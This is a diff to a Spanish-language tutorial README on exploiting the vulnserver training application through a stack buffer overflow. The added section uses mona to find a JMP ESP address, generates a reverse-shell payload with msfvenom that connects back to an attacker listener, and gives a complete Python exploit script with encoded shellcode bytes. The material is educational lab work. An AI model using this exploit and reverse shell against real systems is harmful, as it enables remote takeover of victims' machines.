@@ -33,6 +33,7 @@ Este repositorio sirve como explicación y aplicación de metodología y anális
 * [7.3. Controlando el registro EIP](#step7-3)
 * [7.4. Buscando Bad Characters](#step7-4)
 * [7.5. JMP ESP](#step7-5)
+* [7.6. Generación del Shellcode](#step7-6)
 	
 ---
 ---
@@ -62,6 +63,7 @@ Lista de las principales herramientas utilizadas que sirven como base para reali
     - **Windows SDK**
     - **Java JDK**
     - **Python 3.X y librerías**
+    - **Metasploit, msfvenom**
 
 ---
 
@@ -838,13 +840,31 @@ Una vez que el EIP está bajo control y se identifican los bad chars, el siguien
 
 - Al usar JMP ESP, la ejecución se puede dirigir directamente al shellcode ubicado en la pila.
 
-**El comando !mona jmp -r esp -cpb "\x00" :**
+**El comando _!mona jmp -r esp -cpb "\x00"_ :**
 
 - Busca en los módulos cargados instrucciones que redirijan la ejecución al registro ESP (por ejemplo JMP ESP, CALL ESP, o instrucciones equivalentes que salten a la pila).
 
 - _-cpb "\x00"_ le indica a Mona que filtre y no muestre direcciones cuya representación en bytes contenga el byte \x00 (es decir, evita direcciones que introducirían NULs si se ponen como return address).
 
 Como resultado se devuelve una **lista de direcciones útiles** (módulo, offset, bytes de la instrucción) que se pueden usar como retorno seguro para saltar al shellcode en la pila, excluyendo las que contienen los bad chars especificados.
+
+Otros comandos útiles:
+
+- **!mona asm -s "jmp esp"**
+
+	- Ensambla la instrucción "jmp esp" y muestra su opcode/machine-code (por ejemplo \xFF\xE4) y la representación ensamblada.
+
+	- Útil para saber exactamente qué bytes buscar/inyectar o para confirmar el opcode que luego usarás con !mona find o en un exploit.
+   
+ - **!mona find -s "\xff\xe4" -m essfunc.dll -cpb "\x00"**
+
+	- Busca en el módulo essfunc.dll todas las ocurrencias del patrón de bytes \xFF\xE4 (el opcode de JMP ESP).
+
+ 	- -m essfunc.dll restringe la búsqueda a ese módulo concreto.
+
+	- -cpb "\x00" filtra direcciones que, al representarse en little-endian, contengan el byte \x00 (evita direcciones con NULLs que serían bad-chars si las pones como return address).
+
+	- Resultado: lista de direcciones válidas donde hay un JMP ESP (o el patrón buscado), junto con info del módulo/offset — sirve para elegir una dirección segura para usar como retorno en el exploit.
 
 <img width="1829" height="196" alt="image" src="https://github.com/user-attachments/assets/60f04651-9293-4181-b269-bc8c59adddbf" />
 
@@ -854,7 +874,7 @@ En la captura se muestran todas aquellas direcciones que se pueden utilizar y qu
 
 Por lo tanto, si podemos sustituir el EIP por la dirección seleccionada que contiene JMP ESP podremos ejecutar el código introducido como payload en ESP.
 
-Para ello se puede hacer uso del siguiente script en Python. Este script envía como entrada a vulnserver un payload que sobrescribe el registro EIP con la dirección 0x625011AF en formato little endian (\xAF\x11\x50\x62) que contiene la instrucción en ensamblador _JMP ESP_ seguido de los caracteres iniciales para el desbordamiento y la dirección se envían una secuencia de NOPs y breakpoints para facilitar la depuración. 
+Para ello se puede hacer uso del siguiente script en Python. Este script envía como entrada a vulnserver un payload que sobrescribe el registro EIP con la dirección 0x625011AF en formato little endian (\xAF\x11\x50\x62) que contiene la instrucción en ensamblador _JMP ESP_ seguido de los caracteres iniciales para el desbordamiento y la dirección se envían una secuencia de NOPs (No Operation) y breakpoints para facilitar la depuración. 
 
 <details>
 <summary><b>Python Script JMP ESP</b></summary>
@@ -921,24 +941,151 @@ Esta vez al ejecutar vulnserver desde Immunity y ejecutar desde CMD el script se
 
 <img width="838" height="438" alt="image" src="https://github.com/user-attachments/assets/a627149a-39af-4bf0-b453-e1bba205a205" />
 
+En este caso se comprueba que no se ha producido desbordamiento. El estado del programa ha pasado a 'Paused' al ejecutarse correctamente.
 
+<img width="970" height="443" alt="image" src="https://github.com/user-attachments/assets/401189ad-3f41-4187-82ea-ee39a25d5ec7" />
 
+- 🟥 En primer lugar se han enviado las 2006 'A's (0x41).
+- 🟦Se ha sobrescrito el contenido del registro EIP con la dirección de salto al ESP
+- 🟪ejecutando por lo tanto el salto al la pila del programa ejecutando los NOPs y 🟧 breaking points añadidos finalmente.
 
+---
 
+<a name="step7-6"></a>
 
+### 🐚 ***7.6. Generación del Shellcode***
 
+Como se ha mostrado anteriormente ya se ha conseguido tener control de ejecución sobre el programa al poder saltar al registro ESP y ejecutar código en la pila.
 
+El siguiente paso es la generación de un shellcode para poder tener acceso al sistema sobre el que se ejecuta vulnserver.
 
+Para ello se puede hacer uso de la herramienta de **Metasploit: _msfvenom_** . Esta herramienta genera y codifica payloads produciendo un shellcode lista para insertar en exploits de distintos formatos (C, Python, raw, etc.).
 
+En este caso, para la generación del shellcode se ha empleado el siguiente comando específico para la máquina atacante.
 
+```
 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 EXITFUNC=thread --bad-chars "\x00" -e x86/shikata_ga_nai --format python
 
+```
 
+- **_-p windows/shell_reverse_tcp_** → el payload a utilizar genera una shell inversa para Windows (la víctima, en este caso vulnserver, abre una conexión TCP de vuelta al atacante).
 
+- **_LHOST=192.168.1.10 LPORT=443_** → dirección y puerto donde el payload intentará conectarse (tu máquina atacante/listener).
 
+- **_EXITFUNC=thread_** → cómo debe terminar el payload cuando finalice: intenta terminar sólo el hilo (thread) para no matar el proceso si es posible.
 
+- **_--bad-chars "\x00"_** → indica a msfvenom que no use el byte \x00 en el shellcode (evitar NULs que truncan cadenas).
 
+- **_-e x86/shikata_ga_nai_** → aplica el encoder shikata_ga_nai (polimórfico) para ofuscar/evitar firmas y, si se le indicó, saltarse bad-chars; también puede cambiar el tamaño del payload.
 
+- **_--format python_** → salida en formato Python: una variable/byte string lista para pegar en un script Python (ej. buf = b"\x90\x90...").
+
+Al ejecutarlo se genera el siguiente shellcode.
+
+<img width="1010" height="683" alt="image" src="https://github.com/user-attachments/assets/39c4cbff-15a3-4749-ab5d-bb0a6f2c8af1" />
+
+A través del siguiente script se emplea el shellcode obtenido.
+Al conectar con vulnserver le envía una entrada (buffer) formada por el siguiente payload:
+
+_buffer = b'A' * 2006 + eip_overwrite + nops + shellcode_
+
+Es decir, se envían las correspondientes 'A's hasta llegar al offset del registro EIP que se sustituye por la instrucción que da el salto al registro ESP y una vez ahí se ejecuta una serie de instrucciones NOP que 'desplazan' la CPU al inicio del shellcode inyectado, asegurando que si el EIP aterriza en algún punto de la secuencia NOP, finalmente llegue al shellcode.
+
+<details>
+<summary><b>Python Script Shellcode</b></summary>
+
+```python
+
+import socket
+
+# Define the target server IP and Port
+target_ip = '127.0.0.1'
+target_port = 9999
+
+# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- (*\vulnserver\essfunc.dll), 0x0
+# The address 0x625011AF is located in the essfunc.dll library, which lacks certain protections like ASLR, Rebase, SafeSEH, and CFG. This makes it a reliable candidate for overwriting EIP.
+# The address 0x625011AF is in little endian format (\xAF\x11\x50\x62)
+eip_overwrite = b'\xAF\x11\x50\x62'
+
+# This is our shellcode, designed to execute when we gain control of the instruction pointer (EIP). It's essential to ensure that your shellcode avoids bad characters.
+buf =  b""
+buf += b"\xbb\x8a\x9a\x96\x07\xdb\xd5\xd9\x74\x24\xf4\x5e"
+buf += b"\x29\xc9\xb1\x52\x31\x5e\x12\x83\xc6\x04\x03\xd4"
+buf += b"\x94\x74\xf2\x14\x40\xfa\xfd\xe4\x91\x9b\x74\x01"
+buf += b"\xa0\x9b\xe3\x42\x93\x2b\x67\x06\x18\xc7\x25\xb2"
+buf += b"\xab\xa5\xe1\xb5\x1c\x03\xd4\xf8\x9d\x38\x24\x9b"
+buf += b"\x1d\x43\x79\x7b\x1f\x8c\x8c\x7a\x58\xf1\x7d\x2e"
+buf += b"\x31\x7d\xd3\xde\x36\xcb\xe8\x55\x04\xdd\x68\x8a"
+buf += b"\xdd\xdc\x59\x1d\x55\x87\x79\x9c\xba\xb3\x33\x86"
+buf += b"\xdf\xfe\x8a\x3d\x2b\x74\x0d\x97\x65\x75\xa2\xd6"
+buf += b"\x49\x84\xba\x1f\x6d\x77\xc9\x69\x8d\x0a\xca\xae"
+buf += b"\xef\xd0\x5f\x34\x57\x92\xf8\x90\x69\x77\x9e\x53"
+buf += b"\x65\x3c\xd4\x3b\x6a\xc3\x39\x30\x96\x48\xbc\x96"
+buf += b"\x1e\x0a\x9b\x32\x7a\xc8\x82\x63\x26\xbf\xbb\x73"
+buf += b"\x89\x60\x1e\xf8\x24\x74\x13\xa3\x20\xb9\x1e\x5b"
+buf += b"\xb1\xd5\x29\x28\x83\x7a\x82\xa6\xaf\xf3\x0c\x31"
+buf += b"\xcf\x29\xe8\xad\x2e\xd2\x09\xe4\xf4\x86\x59\x9e"
+buf += b"\xdd\xa6\x31\x5e\xe1\x72\x95\x0e\x4d\x2d\x56\xfe"
+buf += b"\x2d\x9d\x3e\x14\xa2\xc2\x5f\x17\x68\x6b\xf5\xe2"
+buf += b"\xfb\x54\xa2\xed\xf0\x3c\xb1\xed\x07\x06\x3c\x0b"
+buf += b"\x6d\x68\x69\x84\x1a\x11\x30\x5e\xba\xde\xee\x1b"
+buf += b"\xfc\x55\x1d\xdc\xb3\x9d\x68\xce\x24\x6e\x27\xac"
+buf += b"\xe3\x71\x9d\xd8\x68\xe3\x7a\x18\xe6\x18\xd5\x4f"
+buf += b"\xaf\xef\x2c\x05\x5d\x49\x87\x3b\x9c\x0f\xe0\xff"
+buf += b"\x7b\xec\xef\xfe\x0e\x48\xd4\x10\xd7\x51\x50\x44"
+buf += b"\x87\x07\x0e\x32\x61\xfe\xe0\xec\x3b\xad\xaa\x78"
+buf += b"\xbd\x9d\x6c\xfe\xc2\xcb\x1a\x1e\x72\xa2\x5a\x21"
+buf += b"\xbb\x22\x6b\x5a\xa1\xd2\x94\xb1\x61\xf2\x76\x13"
+buf += b"\x9c\x9b\x2e\xf6\x1d\xc6\xd0\x2d\x61\xff\x52\xc7"
+buf += b"\x1a\x04\x4a\xa2\x1f\x40\xcc\x5f\x52\xd9\xb9\x5f"
+buf += b"\xc1\xda\xeb"
+shellcode = buf
+
+# This is a sequence of NOP (No Operation) instructions that 'slides' the CPU to the start of the shellcode, ensuring that if EIP lands somewhere in the NOP sled, it eventually reaches the shellcode. Here, we've added a sequence of 20 NOPs before the shellcode to act as padding.
+nops = b'\x90' * 20
+
+# The buffer is constructed by sending 2006 'A's, followed by the EIP overwrite (address of JMP ESP), then the NOP sled, and finally the shellcode.
+buffer = b'A' * 2006 + eip_overwrite + nops + shellcode
+
+# Command
+command = b'TRUN'
+command_magic = b' .'
+
+try:
+	# Create a socket object and connect to the server
+	print('Exploit> Connect to target')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_ip, target_port))
+
+	# Receive the banner or welcome message from the server
+	banner = s.recv(1024).decode('utf-8')
+	print(f'Server> {banner}')
+
+	# Shellcode
+	print('Exploit> Sending payload')
+	shell = command + command_magic + buffer
+	s.send(shell)
+
+	# Receive the response
+	print('Exploit> The target server is expected to crash. No response will be received.')
+	try:
+		response = s.recv(1024).decode('utf-8')
+		print(f'Server> {response}')
+	except Exception as e:
+		print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')
+
+except Exception as e:
+	# Exception handling
+	print(f'An error occurred: {str(e)}')
+
+finally:
+	# Close the connection
+	s.close()
+
+```
+
+</details>
 
 
 
